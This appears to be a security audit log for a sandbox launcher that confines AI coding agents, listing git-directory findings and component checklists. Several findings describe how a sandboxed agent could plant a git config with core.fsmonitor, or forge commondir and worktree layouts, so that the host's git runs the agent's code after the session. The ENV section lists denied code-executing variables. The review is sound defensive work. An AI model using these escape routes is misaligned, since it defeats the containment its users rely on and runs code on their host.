- **Location:** `sandbox.sh: _git_cd_check()`, the refusal for a worktree's `../..` naming no repository's own git directory, and `_gdi_follow()`'s refusal (GIT-68).
- **What's wrong:**
  - **The grandparent is no common directory.** `objects/`, `refs/` and a `config` with `core.fsmonitor` planted in a real linked worktree's directory, `.git/worktrees/w1`, and the repository's `.git/objects` moved aside (none of them is bound): the refusal says `rm …/worktrees/w1/commondir`, git's own `../..`. After it, `w1` is its own git directory to git, and the checkout's `git status` runs the agent's `core.fsmonitor`. The main repository is visibly broken while its `objects/` is gone. The remedy should say to restore the repository's `objects/` and `refs/` when the grandparent is its git directory.
  - **GIT-68's refusal** says to remove the planted target's `commondir`, which makes that target, the agent's, the outside worktree's own common directory, its `config` then frozen with the agent's keys (LOW: it needs an outside `commondir` naming into a mount, GIT-68's premise, which a WARNING names at every launch). It should say to point the outside `commondir` at the repository's own git directory, or remove the target directory.
  - **The guard GIT-68's fix added** (the grandparent's `commondir` named only outside every writable mount, or when it is a link or no regular file) keys on where the grandparent lies, not on what it is (LOW, contrived mounts): a junk regular `commondir` in a writable mount, with a second mount at `…/worktrees` so the worktree is checked first, names the real worktree's `../..` (following it breaks that worktree, exposing nothing); and a real linked worktree's directory outside every mount, `objects/` and `refs/` planted while it was writable, names its own `../..`. A rule by what the grandparent is: one under `*/worktrees` whose `commondir` is `../..` or its grandparent's path is a linked worktree's directory, and git never nests worktrees, so the planted one is named; otherwise its own.
  - **Tests:** only the whole guard reduced to `true` is caught (G172); dropping `! _in_writable`, the link-or-irregular test, or `_is_common_dir` from it alone passes every test. Kill tests: G172 with the grandparent's `commondir` a regular `../x` outside every mount; a second mount at `$PROJ/.git/worktrees/<w>` with that `commondir` a link to a regular file; `(rm …)` asserted in G165's cases.
  - NIT: outside every mount, "and the agent could write them there" is not so; a `commondir` that is a directory needs `rm -r`.
- **Fix direction:** decide the file to name by what the grandparent is (above); when it is a repository's git directory missing `objects/` or `refs/`, say to restore them; never suggest removing a `commondir` git wrote. Kill tests for each part.
### GIT-71: the check after a session takes a linked worktree's directory the launch saw for a frozen common directory
- **Status: FIXED** (2026-11-12, WSL native agent, the user's choice). The launch records each git directory whose `config` it binds (the protection loop's own, `_git_cd_check()`'s) or that lies under a read-only overlay, in `_git_cfg_frozen`; `_git_runs()` takes a common directory as frozen only when it is there, no longer whenever the launch saw it (`_git_launch_seen`). G175 in `tests/test-git-internals-ro-index.sh`: the review's layout, the common directory named after the session; a worktree the session adds to a protected repository, and a git directory it makes naming a repository under the launcher's read-only overlay, not named for that config. Seen red first (the first check); each of three changes undone alone (either mark of a frozen config, or the old `_git_launch_seen` test back) is caught.
- **Was: OPEN** (2026-11-12). Found by the review of GIT-69's fix; pre-existing.
- **Severity: LOW.** It needs a `.git` file naming a path the launch warned is not there, and the next launch refuses the layout (GIT-67); until then the host's git runs the agent's config with nothing named. Confidence: CONFIRMED by the reviewer with git 2.56, on the trees before and after GIT-69's fix.
- **Location:** `sandbox.sh: _git_runs()`, which reads no `config` of a common directory the launch saw (`_git_launch_seen`), as frozen: but a linked worktree's directory gets no `config` made or bound.
- **What's wrong:** a `.git` file names `.git/worktrees/n`, not there (warned at launch). The session adds `objects/`, `refs/` and a `config` with `core.fsmonitor` to the real linked worktree's directory `.git/worktrees/w1`, and makes `n` with `commondir` `../w1`. After the session nothing is named, while the host's git in the checkout takes `w1` for its common directory and runs `./fsm`.
- **Fix direction:** treat as frozen only a directory whose `config` the launch made or bound (`_git_cd_check()`'s own), not every one it saw.

### GIT-72: the walk up from a mount does not ask whether a directory on the way is itself a bare repository
- **Status: FIXED** (2026-11-12, WSL native agent, the user's choice). `_gdi_bare_up()`, called where git asks it: after a `.git` that is no repository is passed over, and where there is none. A directory that `_is_git_dir()` passes is taken as the repository the mount lies in, as a `.git` directory there is: its index read (against its `core.worktree`), judged out of every writable mount (GIT-44) with its `commondir` followed (`_gdi_out_cd()`), protected in another writable mount's view through the cross-mount queue, and the walk stops there where it is out of every writable mount. G176 in `tests/test-git-internals-ro-index.sh`: the review's layout, protected in the outer mount's view (`config`, `hooks`); the same with a `.git` in it that is no repository; a repository its index records under the inner mount's pruned `vendor/`, protected; one outside every mount whose `core.hooksPath` leads into the mount, named. All seen red first; each of six changes undone alone (the two call sites, the index read, the judging out of every mount, the cross-mount queue, the `_is_git_dir` guard, the last by G145, G155 and G158) is caught. Found on the way: GIT-73.
- **Was: OPEN** (2026-11-12). Found by the review of GIT-69's fix; pre-existing.
- **Severity: LOW.** It needs two writable mounts, one inside the other (`EXTRA_MOUNTS="$M $M/node_modules/a/b"`), and the inner one's parent made a bare repository; git run in the inner mount then reads that repository's `config`, through `core.worktree`. Confidence: CONFIRMED by the reviewer with git 2.56, on the trees before and after GIT-69's fix: the launch exits 0, binds and names nothing, and git in the inner mount resolves `…/node_modules/a` with `core.fsmonitor`.
- **Location:** `sandbox.sh: git_dirs_in()`, the walk up from a mount root to the repository it lies in, which asks of each directory whether its `.git` is one, never whether the directory itself is a git directory, which git's discovery asks right after.
- **Fix direction:** on the way up, take a directory that `_is_git_dir()` passes as the repository the mount lies in, as git does.

### GIT-73: the `./` placeholder makes git ignore a `core.worktree` set in the git directory's `config`
- **Status: OPEN** (2026-11-12). Found by the WSL native agent fixing GIT-72; pre-existing since the placeholder.
- **Severity: MEDIUM.** It changes what the host's git does in the user's own repositories, silently, and for good: the placeholder stays after the launch. Git then takes the current directory for the work tree, so a `git --git-dir=… add -A`, `commit -a`, `checkout -- .` or `reset --hard` acts on the wrong files. It needs a git directory whose `config` sets `core.worktree` and that git finds without a `.git` file: one used with `--git-dir` or `GIT_DIR` (a "dotfiles" bare repository with `core.worktree` set, a submodule's git directory under `.git/modules` used directly), or one git finds as the directory itself on the way up (GIT-72's layout). A checkout reached through its `.git` file is not affected: git takes the work tree from where that file lies. Confidence: CONFIRMED (git 2.53, Ubuntu 26.04).
- **Location:** `sandbox.sh: launcher_ro_overlay()`, the protection loop, where a repository's own git directory gets `printf './\n' > "$g/commondir"`; AGENTS.md's "which git treats exactly as no `commondir`".
- **What happened:** git takes any git directory with a `commondir` for a linked worktree's, and reads `core.worktree` for one only from `config.worktree`, never from the common `config`. Measured with `core.bare=false` and `core.worktree` naming `wt/`, from another directory `cwd/`: `git --git-dir=<dir> status --short` lists `wt/`'s file with no `commondir`, and `cwd/`'s with a `commondir` of `./`, `.`, nothing, the directory's absolute path, or that path with `/`; `rev-parse --show-toplevel` prints `cwd/`. With `extensions.worktreeConfig` on and `core.worktree` in `config.worktree`, `wt/` again. In GIT-72's layout, `git -C <inner mount> add` failed after the first protected launch ("this operation must be run in a work tree"). A submodule's checkout, through its `.git` file, kept working.
- **Fix direction:** no `commondir` spelling keeps `core.worktree` working, so a git directory whose `config` sets `core.worktree` needs something other than the placeholder: say what the launch would change and refuse, or leave `commondir` absent there and judge it otherwise (the agent could then make one, which GIT-67's refusal catches at the next launch, after the host's git has run it once). Measure what git 2.56 does first, and say in AGENTS.md what the placeholder changes.
## LNCH

- `-v` parsing in `launcher_ro_overlay`:
  - `:ro` is detected among comma-separated options.
  - Named volumes and file binds are correctly ignored.
  - Sources are canonicalised with `pwd -P`.
  - Containment is compared per path component (`/x/pro` vs `/x/proj`).
  - No caller passes writable host binds via `--mount`, so `-v`-only parsing misses nothing.
- Shallowest-first ordering:
  - A pin can never land inside an existing `ro_dsts` entry, because a candidate inside one is skipped before its pins are computed.
  - Unrepresentable launchers leave nested ones to be handled, and pins through an unrepresentable name fail with them.
- Pins: every directory between the mount root and the launcher gets one, keyed by destination, so two mounts exposing the same launcher each get their own set. A move of the directory above the launcher is refused (case 455).
- Unlistable handling: the `find` predicate matches the AGENTS.md description (owner class exact for you, kernel `-r`/`-x` otherwise, agent reachability from mode bits and its single group). A mount root you cannot list refuses the launch. Identity is validated (numeric, ≤ 4294967294).
- `_bind_mount_arg` / `_mount_representable` / `_utf8_valid`:
  - CSV quoting and `""` doubling for `--mount`.
  - The `:`-only switch to `--mount`.
  - Refusal of a trailing Unicode-space or CR value via `--mount`.
  - `od`/`awk` UTF-8 validation: overlongs, surrogates, > U+10FFFF and truncated sequences all fail; ASCII and empty pass.
- `_link_walk` / `_path_walk` / `_readlink_exact` / `_walk_exposed`:
  - Kernel-style resolution: `..` is taken from the physical directory, and `^` marks the directories stepped out of.
  - The 40-link loop bound.
  - The exact target read via `readlink -n` + sentinel.
  - The home exemption that still judges the launcher's own writable inner binds.
  - Mount-point exemption only for `replace` steps.
- The symlink-on-reached-path warning works, because `script_dir` is logical (`pwd`), not physical.
- Concurrent-swap manifest:
  - A symlink swap before the manifest stat (no `-L`, so the link's own inode is recorded) or after it both produce a mismatch at the entrypoint.
  - NUL-separated records survive any destination name.
  - A failed stat records `0 0`, which fails closed.
  - The anchor and manifest come only from launcher `-e`/`-v`, never from container.env.
  - The EXIT trap also runs on SIGHUP/SIGTERM; the sweep needs both an age of over 60 min and a dead pid, never fails the launch, and cannot hit a group dir, since group names cannot start with `.`.
  - `group.sh` globs ignore `.verify-*`.
- GNU/BSD `stat` probe: done once, output validated, no fallback-on-failure.
- `verify_launcher_mounts` under `set -euo pipefail`: unreadable or missing manifest gives a NOTE, anchor mismatch gives a NOTE, entry mismatch gives `exit 1`. `tests/test-launcher-verify.sh` runs it under `-e`, and mutation 461 is killable on a preserving host.
- Tests: hermetic `tests/test-launcher-dir-ro.sh` (45 groups) and `tests/test-launcher-verify.sh` pass at HEAD. Cases 450/455/460 have paired positive controls (writable marker/root) and do not look vacuous. T38's claim is the one LNCH-1 defeats (it plants links in only one launcher).

## ENV

- `container_env_filter()` against docker's `parseKeyValueFile`: BOM on line 1 only, `unicode.IsSpace` leading trim (the uws list matches Go's White_Space set), one CR dropped by bufio, the 65535/65536 line limit, UTF-8 checked on non-comment lines (comments are dropped before docker sees them, so docker's whole-file UTF-8 failure cannot happen), `export NAME=`, whitespace in names. Every remaining divergence errs toward refusing.
- The launcher `-e` set is read from `launcher_env` itself, including conditional `${X:+-e …}` entries. `AI_CONTAINER_ENV_KEYS` and `_aice_*` are reserved. `AI_LAUNCHER_ANCHOR` set from container.env when no verify dir exists is harmless, because stash runs before `verify_launcher_mounts`.
- The held-open fd (`exec {_app_fd}< <(…)`) is inherited by docker, and there is no pipe-buffer deadlock (docker reads the file before anything else). Keys are joined with the default IFS.
- `stash_app_env()`: the `_aice_` namespace, `unset -v`, splitting without `read`, readonly names skipped. Nothing before it reads the environment except bash's own start-up, and every start-up key that executes code (BASH_ENV, SHELLOPTS, BASH_FUNC_*, PS4, ENV, POSIXLY_CORRECT, …) is denied. FUNCNEST, TMOUT, TEXTDOMAIN* and image ENV overrides (NVM_DIR etc., which no root-side script reads) were checked and are harmless.
- Every root step after the stash (link_default_ruby, link_agent_tools, firewall, daemons) runs without app env. `run_services` prepare uses `env -i`; start strips the runner's path overrides. `as_sandbox_user` and the capsh `exec env "$@" /bin/bash -l` hand-over are correctly quoted.
- Case 320 and mutations 320–322 all `git apply --check` cleanly and target the right halves. Root's environment is read from a root daemon's /proc environ, not from `docker exec`.
- `repos_path_in_container()`: path-component prefix match, resolve_path on both sides, fallback to /workspace.
- SKILL_CHAR_BUDGET / SLASH_COMMAND_TOOL_CHAR_BUDGET defaults, host override, refused from container.env through `-e`.
- CONTAINER_NAME derivation: leading-character strip, `workspace` fallback, PID suffix keeps it ≥2 characters.
- `selinux_security_opt()` and every caller: sandbox.sh, all five repo.sh seed paths (with `ensure_seed_image` before each, including `collect_inspections` and `reset_one`), `rvm_volume_ensure`, extract-discovery.sh, and verify-on-host.sh in a subshell (sourcing sandbox-common.sh prints nothing to stdout).
- `--shm-size` only when `CONTAINER_SHM_SIZE` is set or playwright is active. The `.gradle/.m2` gate is `any_has_versions` over the JVM keys. The `.yarn/.aws/.azure/.kube` gating, and `read -ra` splitting of multi-path `config_dir`.
- DOCS_PATH / ARCHITECTURE_REPO_PATH: `parse_pointer_spec` suffixes, `@name` desugar into REPOS, primary and already-mounted re-pointing.
- `load_env_defaults` parsing: set-if-unset precedence, matched-quote strip, CR tolerance.
- The hermetic tests test-env-file, test-repos-path, test-skill-char-budget, test-container-name, test-selinux-label, test-tool-config-mounts, test-architecture-path, test-host-preflight and test-sourced-guards all pass at HEAD, and each fails loudly when the launch never reaches docker.

## RT

- Python version arithmetic in `install_uv`: `minor > 0` guards x.0, 3.10 becomes 3.9, and both values are checked as numeric before use. The retry keeps the extra arguments (mkdocs `--with mkdocs-material`).
- `UV_PYTHON_INSTALL_DIR` is exported in the reconcile and in profile.d. `--no-managed-python` is on the first attempt and on the probe.
- `install_claude_native`: picks the version with `sort -V`; the EOF-read pitfall is handled; an empty versions dir (literal `*`) falls through to install; it keys on the persisted dir rather than the ephemeral launcher.
- `link-agent-tools.sh`: links only `AI_RUNTIME_TOOLS` members with an exact comma match, removes a stale link for a disabled tool, does not link a missing binary, and always exits 0. No `~/.ai-tools` bin dir is on the baked PATH. The leftover-Claude fallback is gated on claude-code.
- nvm prefix: no `.npmrc`, `prefix=` or `NPM_CONFIG_PREFIX` is baked. `npm-agent-tools` is a function. The reconcile passes `--prefix` on each npm call.
- Non-fatal claims: every entrypoint caller ends in `|| true`; the reconcile and the link scripts exit 0 on install failures; an `exec 9>` failure on the lock degrades to running without the lock rather than aborting.
- `link-node-globals.sh`: package-name parsing for scoped and unscoped packages, npm and corepack skipped, refusal to overwrite a foreign destination, the qmd wrapper's quoting, and failing the build on an unresolvable link. Its ordering after every `npm install -g` layer is tested.
- rvm-reconcile.sh: flock, re-bootstrap of a half-written rvm, literal whole-line version match, a default that is set only once and only to an installed version. /etc/profile.d/rvm.sh is OK.
- Hermetic tests test-agent-tools-reconcile / test-link-agent-tools / test-link-node-globals / test-runtime-tools-csv all pass. Mutation patches 700–760 still apply (`git apply --check`).

## PRJ

- shared-files.sh completeness: I grepped every `source`/`.`/script-dir reference and every `*.sh` name in non-comment code of every shared file. Each one resolves to a listed file or to a directory that is rsynced (tools.d, services.d, allowlist-*.d). The extra names were `runme.sh`, `project-init.sh` (version.sh uses it only as a base-repo discriminator), and false positives (install.sh, name.sh, 1.sh). repo-git-reset.sh, bash-floor.sh, host-preflight.sh and version.sh are all present. The Dockerfile COPY sources are checked by test-shared-files-parity. migrations/ is not needed in a project, because hooks run from the base repo.
- version.sh: the recorded `engine-version` takes priority over git, git is asked only when project-init.sh is present, and a stale record is removed when the version is unknown.
- sync-to-projects.sh: `conf_key_comment` (blank-line reset keeps the file header's `# schema-version` out of appended blocks; verified), the mktemp-guarded `conf_set_version`, the numeric hook ordering (`10#$nnn`), the inner `.gitignore` backfill, and that `backfill_sandbox_env` cannot pick up a shared script (none contains a literal `export IMAGE_NAME=`).
- check-sandbox-version.sh / bump-sandbox-version.sh: `comm` input is sorted consistently in the same locale; the slug and duplicate checks are sound.
- repo-git-reset.sh: primary detection order, the destructive pass failing safe on ambiguous `refname:short`, and record parsing/rendering in `reset_git` (unknown records are printed verbatim).
- repo.sh: confirmation gates for rm/reset/gc (TTY or `--yes`), the reset flow from inspect to the approved branch, SELinux option resolution before side effects, and the registry upsert/remove.
- extract-discovery.sh: the coverage matching mirrors `matches_wildcard_domain()`, deletes remove only fixed basenames, and `--clean`/`--discard` are mutually exclusive.
- migrate-runme.sh: parse_exports/parse_invocation, no-clobber backups, sourcing guard in project-init.sh (`(return 0 2>/dev/null)`).
- changelog-coverage.sh: diff against the first parent, here-string grep (no SIGPIPE), skips outside git.
- Hermetic tests run: test-repo-destructive, test-repo-registry, test-repo-git-reset, test-group-lifecycle, test-project-init, test-sync-project, test-shared-files-parity, test-extract-discovery, test-version, test-migrate-runme, test-rsync-preflight, test-report and test-check-sandbox-version all PASS under C.UTF-8. Under en_US.UTF-8 only test-repo-destructive fails (PRJ-7).

## SVC

- **Root boundary in `prepare`.** `entrypoint.sh: run_services()` runs `prepare` under `env -i` with a fixed PATH and only AI_SERVICES/SANDBOX_UID/SANDBOX_GID. AI_SERVICES comes from a launcher `-e`, which container.env cannot set. Service names are held to `NAME_RE` and must be an existing file in the image's root-owned `/etc/ai-containers/services.d`, so a crafted `sandbox.conf` value (e.g. `postgres=17,foo=bar`) cannot get root to source anything else. Every adapter default that root reads or executes in `prepare` (PG major file, lib root, socket dirs, `--version` probes) is an image path. `start` drops the runner's path overrides (`AI_SERVICES_DIR/STATE_ROOT/LOG_ROOT`) in two ways: filtered from the stash and `env -u`.
- **Injection.** `prepare` creates only image-default directories, before any agent process exists. On the SQL side, postgres identifiers are double-quoted with `"` doubled, and role/db names are held to `^[a-z_][a-z0-9_]*$`; the superuser name is quoted but not held to the pattern. MySQL user names go through `_mysql_str` (backslash and `'` escaped), passwords too, and database names are regex-held before backtick quoting. No injection found.
- **Watchdog.** `start-services.sh: run_bounded()` puts the command in its own process group, signals the group, falls back to the PID, re-KILLs the group after `wait`, and rejects `TIMEOUT=0`. `set -m` in a non-interactive shell prints no job notices (checked, with and without a tty). The only leftover is an orphaned `sleep` for at most TIMEOUT seconds per service, which is harmless. Daemonised servers (`redis --daemonize`, `mysqld --daemonize`, `mongod --fork`, pg_ctl's postmaster) are outside the group. mariadbd stays in it, which is correct: a timeout kills it.
- **Readiness.** Redis compares the INFO `process_id` with its own pid file; Redis writes the pid file only after binding. MariaDB compares `@@pid_file` with this start's path. mysqld `--daemonize`, `mongod --fork` and `pg_ctl -w` each wait on their own child. Another server cannot pass for any of them, except in the env-redirection case in SVC-1.
- **IPv6.** The `/proc/net/if_inet6` regex `^0{31}1 .* lo$` matches the kernel's format. Redis's `-::1` is optional. MySQL 8.0.13+ and MariaDB 10.11 accept comma lists in `--bind-address`. Postgres `listen_addresses='localhost'` tolerates a missing ::1. The integration listener checks use the right hex ports (1538/18EB/0CEA/8124/6989) and the right `/proc/net/tcp6` encoding of ::1.
- **Adapter contract.** All five adapters define the five functions, every `svc_provision` returns 0, and nothing outside the watchdog can block.
- **Dockerfile layers.** PGDG fails closed (`--error-on=any` plus the `apt-cache policy` check). PGDG's main component only. MySQL and MariaDB templates wait for the bootstrap server to exit before the snapshot, and MariaDB uses `--auth-root-authentication-method=normal`, so `-uroot` works as the sandbox user. The MariaDB `Release` probe and `=1:<series>.*` pin, the Mongo series probe, the major key and `mongodb-org-server=<series>.*` are correct. Mongo's list and keyring names are consistent with the db-clients=mongo layer. The SHELL is bash, so the `<<<` and the arrays are valid.
- **Build-time validation.** `build.sh: validate_config()` and `validate_server_on_off()` handle lists, case variants, leading zeros, minors and releases, and refuse mysql together with mariadb. Build args are emitted only when a key is active.
- **Runtime wiring.** `sandbox-common.sh: services_csv()` uses `is_active`. `version_matches` handles prefixes (17 does not match 170.1).
- **Tests.** All six hermetic tests pass (test-start-services, -postgres, -redis, -mysql, -mariadb, -mongo), and all 23 mutation patches for 780–814 still `git apply --check` against HEAD.
- **Restart instructions** in docs/components/*.md checked for postgres, mysql, redis and mariadb. `mysqladmin`/`mariadb-admin shutdown` wait for the pid file, and redis removes its pid file on shutdown.

## BLD

- github_token handling in the nvm, pyenv and tools layers. The credential helper keeps the token in env only (no URL rewrite). `/tmp/gh-curl.cfg` is created 0600 and removed in the same RUN; any failure path fails the build, so no layer is committed. When no `--secret` is passed the mount is empty and every path stays anonymous. A stale token falls back to an anonymous curl for the installer fetches. Neither curl nor git echoes the token into the log.
- `build.sh` exports GITHUB_TOKEN from the GITHUB_PERSONAL_ACCESS_TOKEN fallback for `--secret id=github_token,env=GITHUB_TOKEN`. `preflight_private_tools` warns correctly.
- The nvm and pyenv retry loops: clean slate per attempt (nvm `rm`+`mkdir`, pyenv `rm` only); `-o` then `bash FILE`; the `-f`/`--retry` rule (`tests/test-build-fetch-retry.sh` passes, and its checker self-tests both ways). `install_url`'s `--retry 2` satisfies the rule.
- `remove_replaced_image()`: early return on same or empty ID, inspect failure treated as gone, tag-count gate, `rmi` without `--force`. The test passes and covers each branch.
- c-toolchain / KEEP_BUILD_TOOLCHAIN: the KEEP layer reinstalls build-essential after the cleanup purge. The qmd-layer purge is gated on KEEP!=1. `make` in the utilities layer is marked manual, so `--auto-remove` keeps it. The RUBY_RUNTIME layer refuses KEEP!=1. Mutation `310-make-not-installed.patch` still applies (with offset), and case 310 asserts `make`.
- Playwright: comma and lowercase refusal, ON→latest, OFF/empty→empty arg, is_active gating of `playwright.txt`, the `NR==1` marker plus `test -s`. `tests/test-playwright.sh` passes.
- `version_list` / `has_versions` for the literal `OFF`; `sandbox.sh` uses `version_list` for RUBY_VERSIONS.
- `generate_allowlists`: every per-component fragment present in `allowlist-domains.d/` has a gate. pyenv.txt (always included) covers PyPI for mkdocs and graphify. `active_tool_fragments` deduplicates. `custom.txt` is seeded from `.example`.
- tools-lib.sh descriptor parsing (comment-strip only after whitespace, trim, reset of stale fields). `expand_placeholders` (braced only). `install_url`: zero or several matching binaries refused, query/fragment stripped before the extension test. `install_repo_file`: JSON-directory guard, empty-file guard, private anonymous fallback suppressed. Public release path with pinned and latest versions. `api_get` discards a partial body.
- `.gitattributes` (`* text=auto eol=lf`): the only tracked non-LF entries are the two instruction symlinks.
- Hermetic tests run and passing: test-tools-d, test-build-fetch-retry, test-remove-replaced-image, test-playwright, test-sandbox-schema, test-parsers.

## TST

- **run-all.sh:**
  - exit 0 is downgraded to FAIL on any `^FAIL:` line;
  - "asserted nothing" fails;
  - SKIP is reported separately;
  - SCAFFOLD-FAILED is its own channel;
  - the mktemp shim is resolved before PATH changes;
  - the developer's pointer env is unset, and test-hermetic-env.sh enforces this (it found 0 violations).
- **integration/run.sh:**
  - rc 77 means SKIP;
  - 124 means a timeout FAIL;
  - rc 0 with a FAIL: line means FAIL;
  - rc 0 with no PASS: means FAIL;
  - a variant that fails to build fails its cases by name;
  - an empty selection is fatal;
  - `--require` handles the unterminated last skip entry;
  - `--cases` naming another variant's case is a deliberate no-op in sibling nightly jobs.
  - lib.sh's `skip()` is never called after an assertion in any case.
- **lib.sh helpers:** sidecar_up and dns_up check functional readiness; sandbox_up waits for PID 1 to be uid 1000; assert_no_capability checks the decode envelope. assert_not_writable/assert_blocked have no liveness check, but the cases that use them carry positive controls (400) or matching mutations (010).
- **docker-shim.sh:** strips `--name`, rewrites `-it`, applies the verify-mount settle, and sandbox.sh has a single `--name "$container_name"`.
- **mutate.sh:** apply/rollback/revert state, the dirty-tree refusal, and the stale/unchecked distinction in check and verify. All 78 patches apply; the six spot-checked patches land on their intended code.
- **test-mutations.sh:** every tiered case has a mutation; exemptions carry reasons.
- **lib-rebuild.sh:** the COPY parser covers all 18 Dockerfile COPY lines (single-source, no flags); no patch touches allowlist fragments.
- **verify-on-host.sh:**
  - VALID_PHASES rejects stale 1/2/3;
  - every phase records failures through phase_fail;
  - the RESULT exit code is right;
  - the schema gate takes BASE_REF from merge-base origin/main, falls back to HEAD^, and refuses HEAD itself;
  - the floor container gets the SELinux option;
  - Phase 7 lints untracked files too, a superset of CI.
- **hermetic-checks.yml:**
  - every job is pinned to ubuntu-24.04;
  - the schema gate uses `pull_request.base.sha` (against the merge checkout) or `event.before`, with a HEAD^ fallback;
  - falsify gates `--max-unproven-pct 10 --max-assertless 0` and then runs `--strict`;
  - the shellcheck install is bounded and retried.
- **tests.yml and nightly.yml:**
  - the PR gate is tests.yml calling hermetic-checks.yml;
  - nightly's hermetic job is gated on schedule and asserted through wf_job_key;
  - integration.yml's push/PR branch spells out `--require security`;
  - workflow_dispatch appends `packages` to exclude.
- **test-code-references.sh:** the fixture proves all seven rules can fail; the real tree resolves cleanly.
- **test-count-idiom.sh:** no missed variants in the tree (searched for `-E -c` and `--count` forms too).
- **portability.sh:** the GNU/BSD probes are made once; `p_zombie` comm parsing is sound.
- **falsify:**
  - the verdict channels are right (timeout, signal and scaffold give UNPROVEN; SURVIVED needs no signal at all);
  - ASSERTLESS is gated at 0;
  - every survivors.txt identity is in an active target;
  - the strict ledger is green at HEAD with 0 stale and 0 obsolete entries.

## DOC

- **Key sets match.** The sandbox.conf keys match AGENTS.md (apart from DOC-13) and docs/components/README.md: every key appears in the README.
  - Every key has a matching entry in build.sh, or is handled through the tools.d/`TOOL_VERSIONS` path (dtctl, acli) or the agent-tier runtime list (mkdocs).
- **Key grammars.** These sandbox.conf comments and component docs match `validate_config`:
  - postgres, redis, mysql, mariadb, mongo, playwright, angular-cli, db-clients
  - the SDKMAN full-patch rule
  - the mysql+mariadb refusal
  - `KEEP_BUILD_TOOLCHAIN` for ruby, db-clients and c-toolchain
- **Allowlist fragments.** Every fragment that AGENTS.md and the docs name exists. The gating matches: playwright `is_active`, mongodb via db-clients, and tools.d fragments via `active_tool_fragments`. PyPI is always reachable through pyenv.txt, so mkdocs works with graphify=OFF.
- **`./sandbox.sh --help`.** Modes, `[primary]` grammar and the defaults shown all match the code:
  - `CONTAINER_*`: 1.0 / 4g / 2g / 4g / 1048576:1048576
  - `SKILL_CHAR_BUDGET` 25000, `SLASH_COMMAND_TOOL_CHAR_BUDGET` 40000
  - `IMAGE_NAME` ai-sandbox, `SANDBOX_GIT_MAX` 200, `SELINUX_LABEL` auto
  - `sandbox.sh build` gives the documented error, and `-V` prints the three version lines.
- **Subcommands and flags.** All match AGENTS.md: repo.sh, group.sh, extract-discovery.sh, ai-containers-report.sh, changelog-coverage.sh, migrate-runme.sh, bump-sandbox-version.sh, the `check-sandbox-version.sh` `BASE_REF` default, and `tests/integration/run.sh` (including `--dry-run`, `--cases`, `--variant`, and variants such as services/mariadb).
- **verify-on-host.sh.** The `PHASES` default `4 5 6 7`, `VALID_PHASES`, and run order 0,5,7,6,4 match.
- **Names AGENTS.md cites.** All exist at HEAD:
  - About 70 function names, including `container_env_filter`, `_link_walk`, `git_dirs_in`, `selinux_security_opt` and `services_csv`.
  - Env vars such as `REPO_VOLUME_PREFIX`, `AI_SERVICES_*`, `AI_LAUNCHER_ANCHOR`, `UV_PYTHON_INSTALL_DIR` and `AI_RUNTIME_TOOLS`.
  - Every test, case, mutation and workflow path it names (spot-checked 230/240/310/320/450–465/730 and 310-make-not-installed.patch).
  - The symlinks `.github/copilot-instructions.md` and `.kiro/steering/AGENTS.md`.
  - The `AI_CONTAINERS_SHARED_FILES` members, plus the tools.d/services.d copies in init and sync.
  - `tests/test-code-references.sh` passes (64 citations).
- **Internal links.** Every internal link and anchor in README, AGENTS and docs resolves, except `#sandboxconf-schema-versioning` in an old, dated CHANGELOG entry.
- **CHANGELOG.**
  - Tags v0.9.x–v0.10.7 match the section headings.
  - Each release from v0.10.0 to v0.10.7 covers its feat/fix commits.
  - Unreleased is empty, but the only changes since v0.10.7 are two test-only commits, so nothing user-facing is missing.
  - `runme.sh` takes the token from `gh` and answers `--version` before building, as the README says.
- **Component docs.** Every docs/components file except graphify.md (DOC-12) and components/README.md (DOC-11) matches its adapter and Dockerfile layer.
